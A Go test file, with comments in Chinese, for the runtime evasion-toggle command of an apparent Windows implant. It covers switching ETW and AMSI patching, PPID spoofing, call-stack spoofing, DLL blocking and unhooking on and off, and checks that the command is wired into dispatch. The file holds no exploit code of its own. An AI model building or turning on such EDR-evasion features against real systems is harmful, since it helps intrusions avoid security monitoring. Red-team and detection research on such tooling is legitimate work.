//go:build windows

package commands

import (
	"implant/core/evasion"
	"strings"
	"testing"

	"implant/core/config"
)

// evasionCleanup 清掉运行期覆盖，避免用例之间互相影响。
func evasionCleanup(t *testing.T) {
	t.Helper()
	config.ClearEvasionOverrides()
	t.Cleanup(func() { config.ClearEvasionOverrides() })
}

// TestEvasionControlStatusListsAll 空参数与 status/list 都打状态表，且七项都在。
func TestEvasionControlStatusListsAll(t *testing.T) {
	evasionCleanup(t)
	for _, arg := range []string{"", "status", "list", "  STATUS  "} {
		out, err := EvasionControl([]byte(arg))
		if err != nil {
			t.Fatalf("EvasionControl(%q) err: %v", arg, err)
		}
		s := string(out)
		if !strings.Contains(s, "对抗能力开关") {
			t.Fatalf("状态表标题缺失 (%q): %s", arg, s)
		}
		for _, want := range []string{"etw", "amsi", "modhide", "spoof", "ppid", "blockdlls", "unhook"} {
			if !strings.Contains(s, want) {
				t.Fatalf("状态表缺 %s (%q): %s", want, arg, s)
			}
		}
		// 启动期能力必须带"关掉不撤销"的说明，否则操作员会以为能回滚。
		if !strings.Contains(s, "不会撤销") {
			t.Fatalf("状态表缺回滚说明: %s", s)
		}
	}
}

// TestEvasionControlRejectsBadArgs 参数错误必须报错而不是打一屏状态表。
func TestEvasionControlRejectsBadArgs(t *testing.T) {
	evasionCleanup(t)
	cases := []struct {
		arg  string
		want string
	}{
		{"on", "用法"},
		{"off", "用法"},
		{"all", "用法"},
		{"all maybe", "用法"},
		{"on nope", "未知能力"},
		{"bogus", "用法"},
	}
	for _, c := range cases {
		if _, err := EvasionControl([]byte(c.arg)); err == nil {
			t.Fatalf("%q 应该报错", c.arg)
		} else if !strings.Contains(err.Error(), c.want) {
			t.Fatalf("%q 错误文案 = %q，期望含 %q", c.arg, err.Error(), c.want)
		}
	}
}

// TestEvasionControlOnOffAppliesOverride 打开/关闭要真的改到生效值上。
func TestEvasionControlOnOffAppliesOverride(t *testing.T) {
	evasionCleanup(t)

	out, err := EvasionControl([]byte("on ppid"))
	if err != nil {
		t.Fatalf("on ppid err: %v", err)
	}
	if !strings.Contains(string(out), "已打开") {
		t.Fatalf("回执缺'已打开': %s", out)
	}
	if !config.EvasionEnabled(config.EvasionPPID) {
		t.Fatal("on ppid 之后生效值仍为关")
	}

	out, err = EvasionControl([]byte("off ppid"))
	if err != nil {
		t.Fatalf("off ppid err: %v", err)
	}
	if !strings.Contains(string(out), "已关闭") {
		t.Fatalf("回执缺'已关闭': %s", out)
	}
	if config.EvasionEnabled(config.EvasionPPID) {
		t.Fatal("off ppid 之后生效值仍为开")
	}
}

// TestEvasionControlKeyAliases 三种拼法都要认（block_dlls / block-dlls / BLOCKDLLS）。
func TestEvasionControlKeyAliases(t *testing.T) {
	evasionCleanup(t)
	for _, alias := range []string{"block_dlls", "block-dlls", "BLOCKDLLS", "Block DLLs"} {
		config.ClearEvasionOverrides()
		if _, err := EvasionControl([]byte("on " + alias)); err != nil {
			t.Fatalf("别名 %q 不被接受: %v", alias, err)
		}
		if !config.EvasionEnabled(config.EvasionBlockDLLs) {
			t.Fatalf("别名 %q 未打开 blockdlls", alias)
		}
	}
}

// TestEvasionControlResetClearsOverrides reset 清空并报出被清掉的键。
func TestEvasionControlResetClearsOverrides(t *testing.T) {
	evasionCleanup(t)

	out, err := EvasionControl([]byte("reset"))
	if err != nil {
		t.Fatalf("reset err: %v", err)
	}
	if !strings.Contains(string(out), "没有运行期覆盖") {
		t.Fatalf("空表 reset 文案 = %s", out)
	}

	if _, err := EvasionControl([]byte("on ppid")); err != nil {
		t.Fatalf("on ppid err: %v", err)
	}
	out, err = EvasionControl([]byte("reset"))
	if err != nil {
		t.Fatalf("reset err: %v", err)
	}
	if !strings.Contains(string(out), "已清除 1 项") || !strings.Contains(string(out), "ppid") {
		t.Fatalf("reset 回执 = %s", out)
	}
	if config.EvasionEnabled(config.EvasionPPID) {
		t.Fatal("reset 之后仍为开")
	}
}

// TestEvasionControlRefusesImpossible 平台做不到的能力要明确拒绝，且不留下"已打开"的假状态。
func TestEvasionControlRefusesImpossible(t *testing.T) {
	evasionCleanup(t)
	if got := config.SyscallMode(); got == "direct" {
		t.Skipf("构建的 syscallMode=direct，伪栈可用，不适用本用例")
	}
	out, err := EvasionControl([]byte("on spoof"))
	if err != nil {
		t.Fatalf("on spoof err: %v", err)
	}
	s := string(out)
	if !strings.Contains(s, "无法生效") || !strings.Contains(s, "syscallMode=direct") {
		t.Fatalf("伪栈拒绝文案 = %s", s)
	}
	if config.EvasionEnabled(config.EvasionSpoof) {
		t.Fatal("被拒绝的能力不该变成开")
	}
}

// TestEvasionControlAllOff 批量关闭不动任何启动期补丁，只改标记。
func TestEvasionControlAllOff(t *testing.T) {
	evasionCleanup(t)
	out, err := EvasionControl([]byte("all off"))
	if err != nil {
		t.Fatalf("all off err: %v", err)
	}
	s := string(out)
	if !strings.Contains(s, "批量关闭") {
		t.Fatalf("回执缺批量标记: %s", s)
	}
	if strings.Count(s, "运行期已关闭") != len(config.EvasionCapabilities()) {
		t.Fatalf("应逐项回执 %d 条: %s", len(config.EvasionCapabilities()), s)
	}
}

// TestEvasionDispatched 源码级棘轮：命令号、分发分支、服务包装三者缺一不可
// （缺了不会编译失败，只会"发了命令没反应"）。
func TestEvasionDispatched(t *testing.T) {
	types := readSourceFile(t, "../services/types.go")
	if !strings.Contains(types, "EVASION = 135") {
		t.Fatal("services/types.go 缺 EVASION = 135")
	}
	disp := readSourceFile(t, "../app/dispatch.go")
	if !strings.Contains(disp, "case services.EVASION:") {
		t.Fatal("dispatch.go 缺 services.EVASION 分支")
	}
	if !strings.Contains(disp, "services.CmdEvasion(cmdBuf)") {
		t.Fatal("dispatch.go 未调用 services.CmdEvasion")
	}
	svc := readSourceFile(t, "../services/evasion.go")
	if !strings.Contains(svc, "commands.EvasionControl(") {
		t.Fatal("services/evasion.go 未转发到 commands.EvasionControl")
	}
}

// TestEvasionGatesAreRuntimeRead 门控点必须读运行期值而不是占位符常量：
// 读常量的话 EVASION 改了覆盖也不会有任何效果（正是"勾了不生效"的形态）。
func TestEvasionGatesAreRuntimeRead(t *testing.T) {
	run := readSourceFile(t, "../app/run.go")
	if !strings.Contains(run, "config.SleepMaskHideEnabled()") {
		t.Fatal("run.go 的睡眠摘链未走 SleepMaskHideEnabled（运行期开关不生效）")
	}
	proc := readSourceFile(t, "procattr_windows.go")
	if !strings.Contains(proc, "config.PpidSpoofEnabled()") || !strings.Contains(proc, "config.BlockDLLsEnabled()") {
		t.Fatal("procattr_windows.go 未分别读取 PPID/BlockDLLs 开关")
	}
	spoof := readSourceFile(t, "../evasion/spoof_windows.go")
	if !strings.Contains(spoof, "func SpoofActive() bool") {
		t.Fatal("spoof_windows.go 缺 SpoofActive 运行期门控")
	}
}

// ===== 能力 → 台账 tag 的映射 =====
//
// 映射错了会让 `evasion off amsi` 去撤 ETW（或什么都不撤），
// 表面上"已关闭"而实际补丁还在。

func TestRevocableTagMapping(t *testing.T) {
	cases := []struct {
		key    config.EvasionKey
		want   string
		wantOK bool
	}{
		{config.EvasionETW, evasion.TagETW, true},
		{config.EvasionAMSI, evasion.TagAMSI, true},
		// 其余能力没有进程内补丁可撤
		{config.EvasionSpoof, "", false},
		{config.EvasionPPID, "", false},
		{config.EvasionBlockDLLs, "", false},
	}
	for _, c := range cases {
		got, ok := revocableTag(c.key)
		if ok != c.wantOK || got != c.want {
			t.Errorf("revocableTag(%s) = (%q,%v)，期望 (%q,%v)", c.key, got, ok, c.want, c.wantOK)
		}
	}
}

// tag 必须与 pkg 内部常量一致（改名会静默让撤销失效）
func TestRevocableTagMatchesEvasionConstants(t *testing.T) {
	if evasion.TagETW != "etw" || evasion.TagAMSI != "amsi" {
		t.Errorf("tag 常量被改动: TagETW=%q TagAMSI=%q", evasion.TagETW, evasion.TagAMSI)
	}
}
